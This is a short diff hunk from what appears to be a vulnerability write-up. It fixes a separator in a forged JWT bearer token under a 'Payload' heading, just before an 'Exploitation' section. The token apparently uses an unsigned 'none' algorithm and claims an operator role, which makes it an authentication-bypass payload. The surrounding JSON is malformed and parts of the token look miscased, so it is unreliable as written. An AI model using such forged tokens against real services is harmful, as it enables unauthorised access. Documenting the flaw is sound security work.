@@ -28,7 +28,7 @@ Payload:
 {
  "name":"Tavares Lunik Bernardi",
  "role":"operador"
- "Authorization: Bearer eyjhbGciOiJub25lIiwidHlwIjoiSldUIn0,eyJuYWIlrjoiVGF2YXJlcyBMdW5payBCZXJuYXJkaSIsInJvbGUiOiJPUEVSQURPUiIsImlhdCI6MTY0MDk5NTIwMCwiZXhwIjoxOTQwOTk1MjAwdQ"
+ "Authorization: Bearer eyjhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJuYWIlrjoiVGF2YXJlcyBMdW5payBCZXJuYXJkaSIsInJvbGUiOiJPUEVSQURPUiIsImlhdCI6MTY0MDk5NTIwMCwiZXhwIjoxOTQwOTk1MjAwdQ"
 }
 
 ## Exploitation
